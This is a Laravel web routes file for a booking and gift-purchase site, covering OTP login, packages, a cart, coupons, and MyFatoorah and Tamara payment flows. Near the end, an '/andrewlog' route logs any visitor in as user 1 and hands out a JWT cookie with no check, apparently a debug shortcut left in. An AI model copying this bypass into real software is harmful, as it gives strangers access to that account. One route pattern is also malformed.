<?php

    use App\Http\Controllers\AddTOCartController;
    use App\Http\Controllers\AuthController;

//    use App\Http\Controllers\BookingNowController;
    use App\Http\Controllers\BookingController;
    use App\Http\Controllers\FrontController;
    use App\Http\Controllers\GiftController;
    use App\Http\Controllers\MyFatoorahController;
    use App\Http\Controllers\PaymentGiftMyFatoorahController;
    use App\Http\Controllers\PaymentGiftTamaraController;
    use App\Http\Controllers\PaymentOrderMyFatoorahController;
    use App\Http\Controllers\PaymentOrderTamaraController;
    use App\Http\Controllers\PaymentTestController;
    use App\Http\Controllers\ShowCategoryController;
    use App\Http\Middleware\AuthenticateToken;
    use App\Http\Middleware\CheckPaymentRedirect;
    use App\Http\Middleware\RedirectIfAuthenticated;
    use App\Http\Middleware\VerifyJwtToken;
    use App\Http\Requests\StoreOrderRequest;
    use App\Services\TamaraService;
    use Illuminate\Support\Facades\App;
    use Illuminate\Support\Facades\Cookie;
    use Illuminate\Support\Facades\Route;
    use Mcamara\LaravelLocalization\Facades\LaravelLocalization;
    use Mcamara\LaravelLocalization\Middleware\LaravelLocalizationRedirectFilter;
    use Mcamara\LaravelLocalization\Middleware\LaravelLocalizationRoutes;
    use Mcamara\LaravelLocalization\Middleware\LaravelLocalizationViewPath;
    use Mcamara\LaravelLocalization\Middleware\LocaleCookieRedirect;
    use Mcamara\LaravelLocalization\Middleware\LocaleSessionRedirect;
    use App\Models\User;
    use Illuminate\Support\Facades\Auth;
    use Tymon\JWTAuth\Exceptions\JWTException;
    use Tymon\JWTAuth\Exceptions\TokenExpiredException;
    use Tymon\JWTAuth\Exceptions\TokenInvalidException;
    use Tymon\JWTAuth\Facades\JWTAuth;
    use Illuminate\Http\Request;
    use Tymon\JWTAuth\JWT;


    Route::group([
        'prefix' => LaravelLocalization::setLocale(),
        'middleware' => ['web', LaravelLocalizationRedirectFilter::class, LocaleSessionRedirect::class, LocaleCookieRedirect::class, LaravelLocalizationViewPath::class, LaravelLocalizationRoutes::class]
    ], function () {

        Route::get('/', [FrontController::class, 'fristPage'])->name('fristPage');

        /** *******************************************************  START AUTHENTICATION ROUTES  ******************************************************* **/

        Route::get('/login', [AuthController::class, 'login'])->name('login')->middleware(RedirectIfAuthenticated::class);
        Route::get('/register', [AuthController::class, 'register'])->name('register')->middleware(RedirectIfAuthenticated::class);
        Route::post('/send-otp', [AuthController::class, 'sendOtp'])->name('send-otp')->middleware(RedirectIfAuthenticated::class);
        Route::post('/verify-otp', [AuthController::class, 'verifyOtp'])->name('verify-otp');

        /** *******************************************************  END AUTHENTICATION ROUTES ******************************************************* **/


        Route::group(['prefix' => '{type?}'], function () {
            Route::get('/home', [FrontController::class, 'index'])->name('index');
        });

        /** *******************************************************  START ABOUT THE SITE  ******************************************************* **/

        Route::get('/about', [FrontController::class, 'about'])->name('about');
        Route::get('/terms-and-conditions', [FrontController::class, 'terms'])->name('terms');

        /** *******************************************************  END ABOUT THE SITE  ******************************************************* **/

        /** *******************************************************  START SERVICES  ******************************************************* **/
        Route::group(['prefix' => '{type?}'], function () {
            //Route::get('/', [FrontController::class, 'allServices'])->name('services');
            Route::get('services/{services}', [FrontController::class, 'services'])->name('getAllCategoriesByServices');

        });


        /** *******************************************************  END SERVICES  ******************************************************* **/

        /** *******************************************************  START PACKAGES  ******************************************************* **/

        Route::group(['prefix' => '{type?}/packages'], function () {
            Route::get('/', [FrontController::class, 'packages'])->name('packages');
            Route::get('/{package}', [FrontController::class, 'getPackage'])->name('showPackage');
        });


        /** *******************************************************  END PACKAGES  ******************************************************* **/


        /** *******************************************************  START CART  ******************************************************* **/

        Route::prefix('cart')->middleware(AuthenticateToken::class)->group(function () {

        });
        Route::group(['prefix' => '{type?}'], function () {
            Route::match(['get', 'post'], '/cart', [AddTOCartController::class, 'ajaxCart'])->name('ajaxCart');
        });

        /** *******************************************************  END CART  ******************************************************* **/

        /** *******************************************************  START GIFT  ******************************************************* **/
        Route::post('/{type?}/gift', [GiftController::class, 'gift'])->name('getGift');

//        Route::middleware(VerifyJwtToken::class)->prefix('gift')->group(function () {
        // Route::post('/', [GiftController::class, 'gift'])->name('getGift');

//        });
        Route::get('/{type?}/gift/{gift}', [GiftController::class, 'show'])->name('showGift');

        Route::post('/gift-payment', function (Request $request, PaymentGiftTamaraController $controller, TamaraService $tamaraService) {

            session()->put('request_data', [
                'latitude' => null,
                'longitude' => null,
                'servicesAvailable' => $request->servicesAvailable,
                'formattedDate' => null,
                'timeAvailable' => null,
                'employeeAvailable' => null,
                'notes' => $request->notes,
                'payment_method' => 'tamara',
                'phone_recipient' => $request->phone_recipient,
                'name_recipient' => $request->name_recipient,
            ]);

            if ($request->has('packageId')) {
                session()->push('request_data.packageId', $request->packageId);
            }

            if ($request->has('categoryId')) {
                session()->push('request_data.categoryId', $request->categoryId);
            }

            $token = $request->cookie('token');
            if (!$token) {
                return redirect()->guest(route('login'));
            }

            try {
                $decoded = JWTAuth::setToken($token)->getPayload()->toArray();
                $postData = [
                    'latitude' => null,
                    'longitude' => null,
                    'servicesAvailable' => $decoded['servicesAvailable'] ?? null,
                    'formattedDate' => null,
                    'timeAvailable' => null,
                    'employeeAvailable' => null,
                    'notes' => $decoded['notes'] ?? null,
                    'payment_method' => $decoded['payment_method'] ?? null,
                    'packageId' => $decoded['packageId'] ?? null,
                    'categoryId' => $decoded['categoryId'] ?? null,
                    'phone_recipient' => $decoded['phone_recipient'] ?? null,
                    'name_recipient' => $decoded['name_recipient'] ?? null,
                ];
            } catch (TokenExpiredException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token expired.');
            } catch (TokenInvalidException $e) {
                return redirect()->guest(route('login'))->with('error', 'Invalid token.');
            } catch (JWTException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token error.');
            }

            $response = $controller->storeOrder($request, $tamaraService);
            session()->forget('request_data');

            return $response;
        })->name('PaymentGIFT.TAMARA');


        // Route::post('/gift-payment', [PaymentGiftTamaraController::class, 'storeOrder'])->name('PaymentGIFT.TAMARA');
        Route::get('/check-order-gift-status/{orderId}', [PaymentGiftTamaraController::class, 'checkOrderStatus']);
        Route::get('/order-gift-cancel/{order_code}', [PaymentGiftTamaraController::class, 'handleCancel'])->name('PaymentGIFT.TAMARA.cancel');
        Route::get('/order-gift-success/{order_code}', [PaymentGiftTamaraController::class, 'handleSuccess'])->name('PaymentGIFT.TAMARA.success');
        Route::get('/order-gift-failed/{order_code', [PaymentGiftTamaraController::class, 'handleFailure'])->name('PaymentGIFT.TAMARA.failed');

        Route::get('/payment/thank_you', function () {
            return 'thank_you';
        })->name('order.thank_you');
        Route::post('/payment-gift/myfatoorah', function (Request $request, PaymentGiftMyFatoorahController $controller) {

            session()->put('request_data', [
                'latitude' => null,
                'longitude' => null,
                'servicesAvailable' => $request->servicesAvailable,
                'formattedDate' => null,
                'timeAvailable' => null,
                'employeeAvailable' => null,
                'notes' => $request->notes,
                'payment_method' => 'myfatoorah',
                'phone_recipient' => $request->phone_recipient,
                'name_recipient' => $request->name_recipient,
            ]);
            session()->put('MyFatoorah', 'GiftMyFatoorah');

            if ($request->has('packageId')) {
                session()->push('request_data.packageId', $request->packageId);
            }

            if ($request->has('categoryId')) {
                session()->push('request_data.categoryId', $request->categoryId);
            }
            $token = $request->cookie('token');
            if (!$token) {
                return redirect()->guest(route('login'));
            }
            try {
                $decoded = JWTAuth::setToken($token)->getPayload()->toArray();
                $postData = [
                    'latitude' => null,
                    'longitude' => null,
                    'servicesAvailable' => $decoded['servicesAvailable'] ?? null,
                    'formattedDate' => null,
                    'timeAvailable' => null,
                    'employeeAvailable' => null,
                    'notes' => $decoded['notes'] ?? null,
                    'payment_method' => $decoded['payment_method'] ?? null,
                    'packageId' => $decoded['packageId'] ?? null,
                    'categoryId' => $decoded['categoryId'] ?? null,
                    'phone_recipient' => $decoded['phone_recipient'] ?? null,
                    'name_recipient' => $decoded['name_recipient'] ?? null,
                ];
            } catch (TokenExpiredException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token expired.');
            } catch (TokenInvalidException $e) {
                return redirect()->guest(route('login'))->with('error', 'Invalid token.');
            } catch (JWTException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token error.');
            }

            $response = $controller->storeOrder($request, $postData);

            session()->forget('request_data');

            return $response;
        })->name('PaymentGIFT.MyFatoorah');


        //   Route::post('/payment-gift/myfatoorah', [PaymentGiftMyFatoorahController::class, 'storeOrder'])->name('PaymentGIFT.MyFatoorah');
        Route::middleware(CheckPaymentRedirect::class)->group(function () {
            Route::get('/payment-gift-success', [PaymentGiftMyFatoorahController::class, 'successGift'])->name('PaymentGIFT.MyFatoorah.success');
            Route::get('/payment-gift-failed', [PaymentGiftMyFatoorahController::class, 'failedGift'])->name('PaymentGIFT.MyFatoorah.failed');
        });
        Route::get('/PaymentGIFT-callback', [PaymentGiftMyFatoorahController::class, 'PaymentGIFTCallback'])->name('PaymentGIFT.MyFatoorah.callback');

        Route::post('/gift/{gift}', [GiftController::class, 'saveOrderGift'])->name('saveOrderGift');


        Route::post('/checkCouponGiftPackage', [GiftController::class, 'checkCouponGifts'])->name('checkCouponAllGIFTS');
        /** *******************************************************  END GIFT  ******************************************************* **/
        /** *******************************************************  START CHECK COUPON  ******************************************************* **/

        Route::post('/checkCoupon', [AddTOCartController::class, 'checkCoupon'])->name('checkCoupon');

        /** *******************************************************  END CHECK COUPON  ******************************************************* **/

        // Route::middleware(['jwt.auth'])->group(function () {
        Route::middleware(VerifyJwtToken::class)->group(function () {

            Route::get('/me', [AuthController::class, 'me'])->name('me');
            Route::match(['get', 'post'], '/logout', [AuthController::class, 'logout'])->name('logout');
            Route::get('/myOrders', [FrontController::class, 'myOrders'])->name('myOrders');
            Route::get('/myOrders/{order_code}', [FrontController::class, 'orderSessions'])->name('myOrdersSessions');
        });
        Route::post('/session/update', [FrontController::class, 'createOrderSessions'])->name('createOrderSessions');
        Route::post('/cancel-order-sessions', [FrontController::class, 'cancelOrderSessions'])->name('cancelOrderSessions');
        Route::get('/showUpdateSession/{session}', [FrontController::class, 'showUpdateSession'])->name('showUpdateSessions');


        /** *******************************************************  START MyFatoorah Payment Gateway  ******************************************************* **/


        //Route::post('/payment/myfatoorah', [PaymentOrderMyFatoorahController::class, 'storeOrder'])->name('PaymentMyFatoorah');

        Route::post('/payment/myfatoorah', function (Request $request, PaymentOrderMyFatoorahController $controller) {

            session()->put('request_data', [
                'latitude' => $request->latitude,
                'longitude' => $request->longitude,
                'servicesAvailable' => $request->servicesAvailable,
                'formattedDate' => $request->formattedDate,
                'timeAvailable' => $request->timeAvailable,
                'employeeAvailable' => $request->employeeAvailable,
                'notes' => $request->notes,
                'payment_method' => 'myfatoorah',
                'phone_recipient' => null,
                'name_recipient' => null,
            ]);
            session()->put('MyFatoorah', 'OrderMyFatoorah');
            if ($request->has('packageId')) {
                session()->push('request_data.packageId', $request->packageId);
            }

            if ($request->has('categoryId')) {
                session()->push('request_data.categoryId', $request->categoryId);
            }
            $token = $request->cookie('token');
            if (!$token) {
                return redirect()->guest(route('login'));
            }
            try {
                $decoded = JWTAuth::setToken($token)->getPayload()->toArray();
                $postData = [
                    'latitude' => $decoded['latitude'] ?? null,
                    'longitude' => $decoded['longitude'] ?? null,
                    'servicesAvailable' => $decoded['servicesAvailable'] ?? null,
                    'formattedDate' => $decoded['formattedDate'] ?? null,
                    'timeAvailable' => $decoded['timeAvailable'] ?? null,
                    'employeeAvailable' => $decoded['employeeAvailable'] ?? null,
                    'notes' => $decoded['notes'] ?? null,
                    'payment_method' => $decoded['payment_method'] ?? null,
                    'packageId' => $decoded['packageId'] ?? null,
                    'categoryId' => $decoded['categoryId'] ?? null,
                    'phone_recipient' => null,
                    'name_recipient' => null,
                ];
            } catch (TokenExpiredException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token expired.');
            } catch (TokenInvalidException $e) {
                return redirect()->guest(route('login'))->with('error', 'Invalid token.');
            } catch (JWTException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token error.');
            }

            $response = $controller->storeOrder($request, $postData);

            session()->forget('request_data');

            return $response;
        })->name('PaymentMyFatoorah');


        Route::middleware(CheckPaymentRedirect::class)->group(function () {
            Route::get('/payment-success', [PaymentOrderMyFatoorahController::class, 'success'])->name('Payment.MyFatoorah.success');
            Route::get('/payment-failed', [PaymentOrderMyFatoorahController::class, 'failed'])->name('Payment.MyFatoorah.failed');
        });
        Route::get('/callback', [PaymentOrderMyFatoorahController::class, 'paymentCallback'])->name('myfatoorah.callback');

        /** *******************************************************  END MyFatoorah Payment Gateway  ******************************************************* **/

        /** *******************************************************  START TAMARA Payment Gateway  ******************************************************* **/

        Route::post('/payment/tamara', function (StoreOrderRequest $request, PaymentOrderTamaraController $controller, TamaraService $tamaraService) {

            session()->put('request_data', [
                'latitude' => $request->latitude,
                'longitude' => $request->longitude,
                'formattedDate' => $request->formattedDate,
                'timeAvailable' => $request->timeAvailable,
                'employeeAvailable' => $request->employeeAvailable,
                'notes' => $request->notes,
                'payment_method' => 'tamara',
                'phone_recipient' => null,
                'name_recipient' => null,
            ]);

            if ($request->has('packageId')) {
                session()->push('request_data.packageId', $request->packageId);
            }

            if ($request->has('categoryId')) {
                session()->push('request_data.categoryId', $request->categoryId);
            }

            $token = $request->cookie('token');
            if (!$token) {
                return redirect()->guest(route('login'));
            }

            try {
                $decoded = JWTAuth::setToken($token)->getPayload()->toArray();
                $postData = [
                    'latitude' => $decoded['latitude'] ?? null,
                    'longitude' => $decoded['longitude'] ?? null,
                    'formattedDate' => $decoded['formattedDate'] ?? null,
                    'timeAvailable' => $decoded['timeAvailable'] ?? null,
                    'employeeAvailable' => $decoded['employeeAvailable'] ?? null,
                    'notes' => $decoded['notes'] ?? null,
                    'payment_method' => $decoded['payment_method'] ?? null,
                    'packageId' => $decoded['packageId'] ?? null,
                    'categoryId' => $decoded['categoryId'] ?? null,
                    'phone_recipient' => $decoded['phone_recipient'] ?? null,
                    'name_recipient' => $decoded['name_recipient'] ?? null,
                ];
            } catch (TokenExpiredException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token expired.');
            } catch (TokenInvalidException $e) {
                return redirect()->guest(route('login'))->with('error', 'Invalid token.');
            } catch (JWTException $e) {
                return redirect()->guest(route('login'))->with('error', 'Token error.');
            }

            $response = $controller->storeOrder($request, $tamaraService);
            session()->forget('request_data');

            return $response;
        })->name('PaymentTAMARA');

        // Route::post('/payment/tamara', [PaymentOrderTamaraController::class, 'storeOrder'])->name('PaymentTAMARA');
        Route::get('/check-order-status/{orderId}', [PaymentOrderTamaraController::class, 'checkOrderStatus']);
        Route::get('/order-cancel/{order_code}', [PaymentOrderTamaraController::class, 'handleCancel'])->name('Payment.TAMARA.cancel');
        Route::get('/order-success/{order_code}', [PaymentOrderTamaraController::class, 'handleSuccess'])->name('Payment.TAMARA.success');
        Route::get('/order-failed/{order_code}', [PaymentOrderTamaraController::class, 'handleFailure'])->name('Payment.TAMARA.failed');

        Route::get('/payment/thank_you', function () {
            return 'thank_you';
        })->name('order.thank_you');

        /** *******************************************************  END TAMARA Payment Gateway  ******************************************************* **/
        /** *******************************************************   START EMPLOYEE FILTERING   ******************************************************  **/
        Route::group(['prefix' => '{type?}'], function () {
            Route::post('/available-employees', [BookingController::class, 'getEmployeesInRadius'])->name('front.availableEmployeesPlaces');


        });
        Route::group(['prefix' => '{type?}'], function () {

            Route::get('/get-available-employees', [BookingController::class, 'getAvailableEmployees'])->name('front.filterEmployees');

        });
        /** *******************************************************   END EMPLOYEE FILTERING   ******************************************************* **/


        /** *******************************************************   START SHOW CATEGOEY   ******************************************************  **/
        Route::group(['prefix' => '{type?}'], function () {
            Route::get('/category/{name}', [ShowCategoryController::class, 'index'])->name('showCategory');
        });

        /** *******************************************************   END SHOW CATEGOEY    ******************************************************* **/


//        Route::get('/gift_recipient', function () {
//            return view('front.gift.recipient');
//        });
// routes/web.php
        Route::get('/testcart', function () {
            return view('front.cart.test');
        });

        Route::get('/testcart2', function () {
            return view('front.cart.test2');
        });


        Route::get('/andrewlog', function () {
            $user = User::find(1);

            Auth::login($user);

            $token = JWTAuth::fromUser($user);

            return response()->json(['message' => 'Logged in successfully'])
                ->cookie('token', $token, 7200, '/', null, true, true, false, 'Strict'); // تعديل صلاحية الكوكيز
        });
    });
    require __DIR__ . '/admin.php';

